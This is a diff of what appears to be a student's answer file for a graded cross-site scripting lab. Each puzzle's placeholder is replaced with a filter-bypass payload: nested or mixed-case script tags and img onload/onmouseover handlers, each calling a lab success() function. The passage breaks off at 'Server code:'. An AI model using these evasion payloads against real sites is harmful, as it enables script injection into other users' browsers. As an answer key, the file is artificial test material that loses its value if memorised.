@@ -5,43 +5,43 @@ N/A
 # 1. A Truly Disruptive Startup (3 points)
 
 ```
-TODO: Replace this with your attack input.
+<script>success()</script>
 ```
 
 # 2. No Script Allowed (3 points)
 
 ```
-TODO: Replace this with your attack input.
+script<script>success()</script>
 ```
 
 # 3. One More Time, Like You Mean It (3 points)
 
 ```
-TODO: Replace this with your attack input.
+<sscriptcript>success()</sscriptcript>
 ```
 
 # 4. An Open-and-Shut Case (3 points)
 
 ```
-TODO: Replace this with your attack input.
+<SCRIPT>success()</SCRIPT>
 ```
 
 # 5. Time to Mix Things Up (3 points)
 
 ```
-TODO: Replace this with your attack input.
+<scripT>success()</scripT>
 ```
 
 # 6. A Picture is Worth a Thousand Words (3 points)
 
 ```
-TODO: Replace this with your attack input.
+</h3> <img src="https://media.geeksforgeeks.org/wp-content/cdn-uploads/20210420155809/gfg-new-logo.png" onload="success()"/>
 ```
 
 # 7. Between a Rock And a Hard Place (3 points)
 
 ```
-TODO: Replace this with your attack input.
+</h3> <img src="https://media.geeksforgeeks.org/wp-content/cdn-uploads/20210420155809/gfg-new-logo.png" onmouseover="success()"/>
 ```
 
 # 8. Angle of Death (6 points)
@@ -49,7 +49,7 @@ TODO: Replace this with your attack input.
 Attack input:
 
 ```
-TODO: Replace this with your attack input.
+<</h3>><script>success()</script>
 ```
 
 Server code:
